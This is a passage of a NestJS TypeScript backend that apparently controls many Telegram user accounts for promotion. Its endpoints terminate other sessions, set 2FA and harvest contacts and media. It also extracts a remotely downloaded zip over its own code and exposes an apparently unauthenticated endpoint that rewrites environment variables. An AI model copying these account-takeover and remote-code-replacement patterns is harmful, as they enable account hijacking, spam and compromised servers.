() => true,\r\n                decompress: true,\r\n            });\r\n\r\n            // Set response status\r\n            res.status(response.status);\r\n\r\n            // Copy all headers from the upstream response\r\n            Object.entries(response.headers).forEach(([key, value]) => {\r\n                // Skip transfer-encoding as it might conflict with our response\r\n                if (key.toLowerCase() === 'transfer-encoding') return;\r\n\r\n                if (Array.isArray(value)) {\r\n                    res.setHeader(key, value);\r\n                } else {\r\n                    res.setHeader(key, value as string);\r\n                }\r\n            });\r\n\r\n            // Log response details\r\n            this.logger.log({\r\n                message: 'Request completed',\r\n                requestId,\r\n                metrics: {\r\n                    executionTime: Date.now() - startTime,\r\n                    status: response.status,\r\n                    contentType: response.headers['content-type']\r\n                }\r\n            });\r\n\r\n            // For binary responses, send the raw buffer\r\n            if (responseType === 'arraybuffer' ||\r\n                response.headers['content-type']?.includes('application/octet-stream') ||\r\n                response.headers['content-type']?.includes('image/') ||\r\n                response.headers['content-type']?.includes('audio/') ||\r\n                response.headers['content-type']?.includes('video/') ||\r\n                response.headers['content-type']?.includes('application/pdf')) {\r\n\r\n                // Ensure content-type is preserved\r\n                if (!res.getHeader('content-type') && response.headers['content-type']) {\r\n                    res.setHeader('content-type', response.headers['content-type']);\r\n                }\r\n\r\n                // Send raw buffer for binary data\r\n                return res.send(Buffer.from(response.data));\r\n            }\r\n\r\n            // For other types, send as is\r\n            return res.send(response.data);\r\n\r\n        } catch (error) {\r\n            this.logger.error({\r\n                message: 'Request failed',\r\n                requestId,\r\n                error: {\r\n                    message: error.message,\r\n                    code: error.code,\r\n                    stack: error.stack\r\n                }\r\n            });\r\n\r\n            // Handle error response\r\n            if (error.response) {\r\n                // Copy error response headers\r\n                Object.entries(error.response.headers).forEach(([key, value]) => {\r\n                    if (key.toLowerCase() === 'transfer-encoding') return;\r\n                    if (Array.isArray(value)) {\r\n                        res.setHeader(key, value);\r\n                    } else {\r\n                        res.setHeader(key, value as string);\r\n                    }\r\n                });\r\n\r\n                return res.status(error.response.status).send(error.response.data);\r\n            }\r\n\r\n            // Handle network or other errors\r\n            return res.status(500).json({\r\n                message: error.message,\r\n                code: error.code\r\n            });\r\n        }\r\n    }\r\n\r\n    // Helper method to sanitize sensitive headers\r\n    private sanitizeHeaders(headers: Record<string, any>): Record<string, any> {\r\n        const sensitiveHeaders = ['authorization', 'cookie', 'set-cookie'];\r\n        return Object.entries(headers).reduce((acc, [key, value]) => {\r\n            if (sensitiveHeaders.includes(key.toLowerCase())) {\r\n                acc[key] = '[REDACTED]';\r\n            } else {\r\n                acc[key] = value;\r\n            }\r\n            return acc;\r\n        }, {});\r\n    }\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule, RequestMethod } from '@nestjs/common';\nimport { UsersModule } from './components/users/users.module';\nimport { UserDataModule } from './components/user-data/user-data.module';\nimport { ClientModule } from './components/clients/client.module';\nimport { TelegramModule } from './components/Telegram/Telegram.module';\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\nimport { initModule } from './components/ConfigurationInit/init.module';\nimport { ChannelsModule } from './components/channels/channels.module';\nimport { AppController } from './app.controller';\nimport { AppService } from './app.service';\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\nimport { BuildModule } from './components/builds/build.module';\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\nimport { StatModule } from './components/stats/stat.module';\nimport { Stat2Module } from './components/stats2/stat2.module';\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\nimport { TgSignupModule } from './components/TgSignup/TgSignup.module';\nimport { TransactionModule } from './components/transactions/transaction.module';\nimport { NpointModule } from './components/n-point/npoint.module';\nimport { TimestampModule } from './components/timestamps/timestamp.module';\n\n@Module({\n  imports: [\n    initModule,\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    BuildModule,\n    UpiIdModule,\n    PromoteMsgModule,\n    PromoteStatModule,\n    StatModule,\n    Stat2Module,\n    TgSignupModule,\n    TransactionModule,\n    NpointModule,\n    TimestampModule,\n  ],\n  controllers:[AppController],\n  providers:[AppService],\n  exports:[\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    TgSignupModule,\n    TransactionModule,\n    TimestampModule\n  ]\n})\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer.apply(LoggerMiddleware).forRoutes('*');\n  }\n}","import { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class AppService {\n  getHello(): string {\n    return 'Hello World!';\n  }\n}\n","console.log(\"in Cloudinary\");\nimport * as cloudinary from 'cloudinary';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport AdmZip from 'adm-zip';\nimport { parseError } from './utils/parseError';\nimport { fetchWithTimeout } from './utils/fetchWithTimeout';\nexport class CloudinaryService {\n    static instance;\n    resources = new Map();\n\n    constructor() {\n        cloudinary.v2.config({\n            cloud_name: process.env.CL_NAME,\n            api_key: process.env.CL_APIKEY,\n            api_secret: process.env.CL_APISECRET\n        });\n    }\n\n    static async getInstance(name) {\n        if (!CloudinaryService.instance) {\n            CloudinaryService.instance = new CloudinaryService();\n        }\n        await CloudinaryService.instance.getResourcesFromFolder(name);\n        return CloudinaryService.instance;\n    }\n\n    public async downloadAndExtractZip(url: string) {\n        const rootPath = process.cwd();\n        const zipPath = path.resolve(rootPath, 'temp.zip');\n        const extractPath = path.resolve(rootPath);\n    \n        console.log(`Starting download of zip file from ${url}`);\n        // Download the zip file\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\n        if (response?.status === 200) {\n            console.log('Zip file downloaded successfully.');\n            fs.writeFileSync(zipPath, response.data);\n            console.log(`Zip file saved to ${zipPath}`);\n            \n            // Extract the zip file using adm-zip\n            const zip = new AdmZip(zipPath);\n            console.log(`Extracting zip file to ${extractPath}`);\n            zip.extractAllTo(extractPath, true);\n            console.log('Zip file extracted successfully.');\n            \n            fs.unlinkSync(zipPath); // Remove the zip file after extraction\n            console.log(`Temporary zip file ${zipPath} deleted.`);\n        } else {\n            const errorMessage = `Unable to download zip file from ${url}`;\n            console.error(errorMessage);\n            throw new Error(errorMessage);\n        }\n    }\n\n    async getResourcesFromFolder(folderName) {\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\n        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);\n        // await this.findAndSaveResources(folderName, 'image');\n    }\n\n    async createNewFolder(folderName) {\n        await this.createFolder(folderName);\n        await this.uploadFilesToFolder(folderName);\n    }\n\n    async overwriteFile() {\n        const cloudinaryFileId = \"index_nbzca5.js\";\n        const localFilePath = \"./src/test.js\";\n\n        try {\n\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\n                resource_type: 'auto',\n                overwrite: true,\n                invalidate: true,\n                public_id: cloudinaryFileId\n            });\n            console.log(result);\n        } catch (error) {\n            parseError(error)\n        }\n\n    }\n\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\n        try {\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\n            await Promise.all(resources.map(async (resource) => {\n                try {\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\n                } catch (error) {\n                    console.log(resource);\n                    parseError(error)\n                }\n            }));\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async createFolder(folderName) {\n        try {\n            const result = await cloudinary.v2.api.create_folder(folderName);\n\n            return result;\n        } catch (error) {\n            console.error('Error creating folder:', error);\n            throw error;\n        }\n    }\n\n    // Function to upload files from URLs to a specific folder in Cloudinary\n    async uploadFilesToFolder(folderName) {\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\n            try {\n                const result = await cloudinary.v2.uploader.upload_large(url, {\n                    folder: folderName,\n                    resource_type: 'auto',\n                    public_id: key, // Set the key as the public_id\n                });\n\n                return result;\n            } catch (error) {\n                console.error('Error uploading file:', error);\n                throw error;\n            }\n        });\n\n        try {\n            return await Promise.all(uploadPromises);\n        } catch (error) {\n            console.error('Error uploading files:', error);\n            throw error;\n        }\n    }\n\n    async printResources() {\n        try {\n            this.resources?.forEach((val, key) => {\n                console.log(key, \":\", val);\n            })\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    get(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    getBuffer(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            console.log(error);\n        }\n    }\n}\n\nasync function saveFile(url: string, name: string) {\n    try {\n        const extension = url.substring(url.lastIndexOf('.') + 1);\n        const rootPath = process.cwd();\n        const mypath = path.join(rootPath, `${name}.${extension}`);\n        console.log(mypath);\n\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\n\n        if (res?.statusText === 'OK') {\n            if (!fs.existsSync(mypath)) {\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Saved!!`);\n            } else {\n                fs.unlinkSync(mypath);\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Replaced!!`);\n            }\n        } else {\n            throw new Error(`Unable to download file from ${url}`);\n        }\n    } catch (err) {\n        parseError(err);\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type ConfigurationDocument = Configuration & Document;\n\n@Schema({\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Configuration { }\n\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { ConfigurationService } from './init.service';\n\n@ApiTags('Configuration')\n@Controller('configuration')\nexport class ConfigurationController {\n  constructor(private readonly configurationService: ConfigurationService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get configuration data' })\n  async findOne(): Promise<any>{\n    return this.configurationService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update configuration' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.configurationService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global, OnModuleDestroy, Inject, OnModuleInit } from '@nestjs/common';\nimport { ConfigModule } from '@nestjs/config';\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\nimport { ConfigurationService } from './init.service';\nimport { ConfigurationSchema } from './configuration.schema';\nimport { ConfigurationController } from './init.controller';\nimport { Connection } from 'mongoose';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n@Global()\n@Module({\n  imports: [\n    ConfigModule.forRoot(), // Ensure ConfigModule is imported\n    MongooseModule.forRootAsync({\n      useFactory: () => ({\n        uri: process.env.mongouri,\n      }),\n    }),\n    MongooseModule.forFeature([{\n      name: 'configurationModule', collection: 'configuration', schema: ConfigurationSchema\n    }])\n  ],\n  providers: [ConfigurationService],\n  controllers: [ConfigurationController],\n  exports: [ConfigModule, MongooseModule],\n})\nexport class initModule implements OnModuleDestroy, OnModuleInit {\n  constructor(@Inject(getConnectionToken()) private readonly connection: Connection) {}\n  async onModuleInit() {\n    console.log(`Started :: ${process.env.clientId}`)\n  }\n\n  async onModuleDestroy() {\n    console.log(\"Init Module Destroying\")\n    await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);\n    this.closeConnection();\n  }\n\n  private closeConnection() {\n    console.log(\"Closing mongoose connection\")\n    this.connection.close(true)\n  }\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Configuration } from './configuration.schema';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { BotConfig } from '../../utils/TelegramBots.config';\n\n@Injectable()\nexport class ConfigurationService {\n    constructor(@InjectModel('configurationModule') private configurationModel: Model<Configuration>) {\n        this.setEnv().then(async () => {\n            await BotConfig.getInstance().ready();\n            fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);\n        });\n\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.configurationModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return user;\n    }\n\n    async setEnv() {\n        console.log(\"Setting Envs\");\n        const configuration: Configuration = await this.configurationModel.findOne({}, { _id: 0 });\n        const data = { ...configuration }\n        for (const key in data) {\n            console.log('setting', key)\n            process.env[key] = data[key];\n        }\n        console.log(\"finished setting env\");\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.configurationModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res, Delete, Put, UseInterceptors, UploadedFile, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse, ApiConsumes, ApiBadRequestResponse, ApiNotFoundResponse, ApiOkResponse, ApiUnauthorizedResponse } from '@nestjs/swagger';\nimport { query, Response } from 'express';\nimport { TelegramService } from './Telegram.service';\nimport {\n    SendMediaDto,\n    SendMediaAlbumDto,\n    GroupSettingsDto,\n    GroupMemberOperationDto,\n    AdminOperationDto,\n    ChatCleanupDto,\n    UpdateProfileDto,\n    PrivacySettingsDto,\n    ProfilePhotoDto,\n    ScheduleMessageDto,\n    BatchProcessDto,\n    BatchOperationType,\n    ForwardBatchDto,\n    ContactExportImportDto,\n    ContactBlockListDto,\n    AddContactsDto,\n    MediaType,\n    createGroupDto,\n    ViewOnceMediaDto,\n    MediaSourceType,\n    CreateBotDto\n} from './dto';\nimport { MediaMetadataDto } from './dto/metadata-operations.dto';\nimport { CreateChatFolderDto } from './dto/create-chat-folder.dto';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { ChatStatistics } from '../../interfaces/telegram';\nimport { ConnectionStatusDto } from './dto/common-responses.dto';\nimport { FileInterceptor } from '@nestjs/platform-express';\nimport * as multer from 'multer';\nimport { connectionManager } from './utils/connection-manager';\nimport { types } from 'util';\nimport { SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';\nimport { DeleteHistoryDto } from './dto/delete-chat.dto';\nimport { UpdateUsernameDto } from './dto/update-username.dto';\nimport { SendMessageDto } from './dto/send-message.dto';\n\n@Controller('telegram')\n@ApiTags('Telegram')\nexport class TelegramController {\n    constructor(private readonly telegramService: TelegramService) { }\n\n    @Get('connect/:mobile')\n    @ApiOperation({ summary: 'Connect to Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully connected' })\n    @ApiResponse({ status: 400, description: 'Connection failed' })\n    async connect(@Param('mobile') mobile: string) {\n        await connectionManager.getClient(mobile);\n        return { message: 'Connected successfully' };\n    }\n\n    @Get('disconnect/:mobile')\n    @ApiOperation({ summary: 'Disconnect from Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully disconnected' })\n    async disconnect(@Param('mobile') mobile: string) {\n        await connectionManager.unregisterClient(mobile);\n        return { message: 'Disconnected successfully' };\n    }\n\n    @Post('disconnect-all')\n    @ApiOperation({ summary: 'Disconnect all clients' })\n    @ApiResponse({ status: 200, description: 'All clients disconnected successfully' })\n    async disconnectAllClients() {\n        await connectionManager.disconnectAll();\n        return { message: 'All clients disconnected successfully' };\n    }\n\n    // Profile Management\n    @Get('me/:mobile')\n    @ApiOperation({ summary: 'Get current user profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Profile retrieved successfully' })\n    async getMe(@Param('mobile') mobile: string) {\n        return this.telegramService.getMe(mobile);\n    }\n\n    @Get('entity/:mobile/:entity')\n    @ApiOperation({ summary: 'Get Entity profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiParam({ name: 'entity', description: 'Entity identifier', required: true })\n    @ApiResponse({ status: 200, description: 'Entity retrieved successfully' })\n    async getEntity(@Param('mobile') mobile: string, @Param('entity') entity: string) {\n        return this.telegramService.getEntity(mobile, entity);\n    }\n\n    @Post('profile/update/:mobile')\n    @ApiOperation({ summary: 'Update profile information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: UpdateProfileDto })\n    async updateProfile(\n        @Param('mobile') mobile: string,\n        @Body() updateProfileDto: UpdateProfileDto\n    ) {\n        return this.telegramService.updateNameandBio(\n            mobile,\n            updateProfileDto.firstName,\n            updateProfileDto.about\n        );\n    }\n\n    @Post('profile/photo/:mobile')\n    @ApiOperation({ summary: 'Set profile photo' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ProfilePhotoDto })\n    async setProfilePhoto(\n        @Param('mobile') mobile: string,\n        @Body() photoDto: ProfilePhotoDto\n    ) {\n        return this.telegramService.setProfilePic(mobile, photoDto.name);\n    }\n\n    @Delete('profile/photos/:mobile')\n    @ApiOperation({ summary: 'Delete all profile photos' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async deleteProfilePhotos(@Param('mobile') mobile: string) {\n        return this.telegramService.deleteProfilePhotos(mobile);\n    }\n\n    // Message Operations\n    @Get('messages/:mobile')\n    @ApiOperation({ summary: 'Get chat messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('limit') limit?: number\n    ) {\n        return this.telegramService.getMessages(mobile, chatId, limit);\n    }\n\n\n    @Post('message/:mobile')\n    @ApiOperation({ summary: 'Send a Telegram message as a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user account to send the message from',\n        required: true,\n        example: '1234567890',\n    })\n    async sendMessage(\n        @Param('mobile') mobile: string,\n        @Body() dto: SendMessageDto,\n    ) {\n        return this.telegramService.sendMessage(mobile, dto);\n    }\n\n    @Post('messages/forward/:mobile')\n    @ApiOperation({ summary: 'Forward messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ForwardBatchDto })\n    async forwardMessage(\n        @Param('mobile') mobile: string,\n        @Body() forwardDto: ForwardBatchDto\n    ) {\n        return this.telegramService.forwardBulkMessages(\n            mobile,\n            forwardDto.fromChatId,\n            forwardDto.toChatId,\n            forwardDto.messageIds\n        );\n    }\n\n    @Post('batch-process/:mobile')\n    @ApiOperation({ summary: 'Process operations in batches' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: BatchProcessDto })\n    async processBatchMessages(\n        @Param('mobile') mobile: string,\n        @Body() batchOp: BatchProcessDto\n    ) {\n        return this.telegramService.processBatch(\n            batchOp.items,\n            batchOp.batchSize || 20,\n            async (batch) => {\n                switch (batchOp.operation) {\n                    case BatchOperationType.FORWARD:\n                        for (const item of batch) {\n                            if ('messageId' in item && item.fromChatId && item.toChatId) {\n                                await this.telegramService.forwardMessage(\n                                    mobile,\n                                    item.toChatId,\n                                    item.fromChatId,\n                                    item.messageId\n                                );\n                            }\n                        }\n                        break;\n                    case BatchOperationType.DELETE:\n                        for (const item of batch) {\n                            await this.telegramService.deleteChat(mobile, { peer: item.chatId, justClear: true });\n                        }\n                        break;\n                    default:\n                        throw new BadRequestException('Unsupported batch operation');\n                }\n            },\n            batchOp.delayMs\n        );\n    }\n\n    @Get('messages/search/:mobile')\n    @ApiOperation({\n        summary: 'Search messages in Telegram',\n        description: 'Search for messages in a specific chat or globally across all chats'\n    })\n    @ApiOkResponse({\n        description: 'Messages successfully found',\n        type: SearchMessagesResponseDto\n    })\n    @ApiBadRequestResponse({ description: 'Invalid request parameters' })\n    @ApiNotFoundResponse({ description: 'Mobile number not registered' })\n    @ApiUnauthorizedResponse({ description: 'Unauthorized access' })\n    async searchMessages(\n        @Param('mobile') mobile: string,\n        @Query() queryParams: SearchMessagesDto\n    ): Promise<SearchMessagesResponseDto> {\n        return this.telegramService.searchMessages(mobile, queryParams);\n    }\n\n    // Channel Operations\n    @Get('channels/:mobile')\n    @ApiOperation({ summary: 'Get channel information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'includeIds', required: false, type: Boolean })\n    async getChannelInfo(\n        @Param('mobile') mobile: string,\n        @Query('includeIds') includeIds?: boolean\n    ) {\n        return this.telegramService.getChannelInfo(mobile, includeIds);\n    }\n\n    @Post('forwardMediatoMe/:mobile')\n    @ApiOperation({ summary: 'Forward media messages to me' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel username or ID', required: false })\n    @ApiQuery({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false })\n    async forwardMedia(\n        @Param('mobile') mobile: string,\n        @Query('channel') channel?: string,\n        @Query('fromChatId') fromChatId?: string\n    ) {\n        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n        return this.telegramService.forwardMedia(\n            mobile,\n            channel,\n            fromChatId\n        );\n    }\n\n    @Post('channels/leave/:mobile')\n    @ApiOperation({ summary: 'Leave channel' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel ID/username', required: true })\n    async leaveChannel(\n        @Param('mobile') mobile: string,\n        @Query('channel') channel: string\n    ) {\n        return this.telegramService.leaveChannel(mobile, channel);\n    }\n\n    @Patch('username/:mobile')\n    @ApiOperation({ summary: 'Update the Telegram username of a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user whose username should be updated',\n        required: true,\n        example: '1234567890',\n    })\n    async updateUsername(\n        @Param('mobile') mobile: string,\n        @Body() updateUsernameDto: UpdateUsernameDto,\n    ) {\n        return this.telegramService.updateUsername(mobile, updateUsernameDto.newUsername);\n    }\n\n    // Security & Privacy\n    @Post('2fa/:mobile')\n    @ApiOperation({ summary: 'Setup two-factor authentication' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async setup2FA(@Param('mobile') mobile: string) {\n        return this.telegramService.set2Fa(mobile);\n    }\n\n    @Post('privacy/:mobile')\n    @ApiOperation({ summary: 'Update privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updatePrivacy(@Param('mobile') mobile: string) {\n        return this.telegramService.updatePrivacy(mobile);\n    }\n\n    @Post('privacy/batch/:mobile')\n    @ApiOperation({ summary: 'Update multiple privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: PrivacySettingsDto })\n    async updatePrivacyBatch(\n        @Param('mobile') mobile: string,\n        @Body() settings: PrivacySettingsDto\n    ) {\n        return this.telegramService.updatePrivacyBatch(mobile, settings);\n    }\n\n    // Session Management\n    @Get('sessions/:mobile')\n    @ApiOperation({ summary: 'Get active sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Active sessions retrieved successfully' })\n    async getActiveSessions(@Param('mobile') mobile: string) {\n        return this.telegramService.getAuths(mobile);\n    }\n\n    @Delete('sessions/:mobile')\n    @ApiOperation({ summary: 'Terminate other sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Other sessions terminated successfully' })\n    async terminateOtherSessions(@Param('mobile') mobile: string) {\n        return this.telegramService.removeOtherAuths(mobile);\n    }\n\n    @Post('sessions/new/:mobile')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'New session created successfully' })\n    async createNewSession(@Param('mobile') mobile: string) {\n        return this.telegramService.createNewSession(mobile);\n    }\n\n    @Get('session/info/:mobile')\n    @ApiOperation({ summary: 'Get session information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getSessionInfo(@Param('mobile') mobile: string) {\n        return this.telegramService.getSessionInfo(mobile);\n    }\n\n    @Post('session/terminate/:mobile')\n    @ApiOperation({ summary: 'Terminate specific session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async terminateSession(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        return this.telegramService.terminateSession(mobile, data);\n    }\n\n    // Monitoring & Health\n    @Get('monitoring/status')\n    @ApiOperation({ summary: 'Get service health and connection status' })\n    @ApiResponse({ status: 200, type: ConnectionStatusDto })\n    async getConnectionStatus() {\n        return {\n            status: await this.telegramService.getConnectionStatus()\n        };\n    }\n\n    @Get('monitoring/calllog/:mobile')\n    @ApiOperation({ summary: 'Get call log statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getCallLogStats(@Param('mobile') mobile: string) {\n        return this.telegramService.getCallLog(mobile);\n    }\n\n    // Contact Management\n    @Post('contacts/add-bulk/:mobile')\n    @ApiOperation({ summary: 'Add multiple contacts in bulk' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AddContactsDto })\n    @ApiResponse({ status: 200, description: 'Contacts added successfully' })\n    async addContactsBulk(\n        @Param('mobile') mobile: string,\n        @Body() contactsDto: AddContactsDto\n    ) {\n        return this.telegramService.addContacts(\n            mobile,\n            contactsDto.phoneNumbers,\n            contactsDto.prefix\n        );\n    }\n\n    @Get('contacts/:mobile')\n    @ApiOperation({ summary: 'Get all contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contacts retrieved successfully' })\n    async getContacts(@Param('mobile') mobile: string) {\n        return await this.telegramService.getContacts(mobile);\n    }\n\n    //To Cleanup\n    @Post('media/send/:mobile')\n    @ApiOperation({ summary: 'Send media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaDto })\n    async sendMedia(\n        @Param('mobile') mobile: string,\n        @Body() sendMediaDto: SendMediaDto\n    ) {\n        const client = await connectionManager.getClient(mobile);\n        if (sendMediaDto.type === MediaType.PHOTO) {\n            return client.sendPhotoChat(\n                sendMediaDto.chatId,\n                sendMediaDto.url,\n                sendMediaDto.caption,\n                sendMediaDto.filename\n            );\n        }\n        return client.sendFileChat(\n            sendMediaDto.chatId,\n            sendMediaDto.url,\n            sendMediaDto.caption,\n            sendMediaDto.filename\n        );\n    }\n\n    @Get('media/download/:mobile')\n    @ApiOperation({ summary: 'Download media from a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'messageId', required: true })\n    async downloadMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('messageId') messageId: number,\n        @Res() res: Response\n    ) {\n        return this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);\n    }\n\n    @Post('media/album/:mobile')\n    @ApiOperation({ summary: 'Send media album (multiple photos/videos)' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaAlbumDto })\n    async sendMediaAlbum(\n        @Param('mobile') mobile: string,\n        @Body() albumDto: MediaAlbumOptions\n    ) {\n        return this.telegramService.sendMediaAlbum(mobile, albumDto);\n    }\n\n    @Get('media/metadata/:mobile')\n    @ApiOperation({ summary: 'Get media metadata from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'types', enum: ['photo', 'video', 'document'], required: false, isArray: true })\n    @ApiQuery({ name: 'startDate', required: false })\n    @ApiQuery({ name: 'endDate', required: false })\n    @ApiQuery({ name: 'limit', description: 'Number of messages to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'minId', required: false, type: Number })\n    @ApiQuery({ name: 'maxId', required: false, type: Number })\n    async getMediaMetadata(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: ('photo' | 'video' | 'document' | 'voice')[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('minId') minId?: number,\n        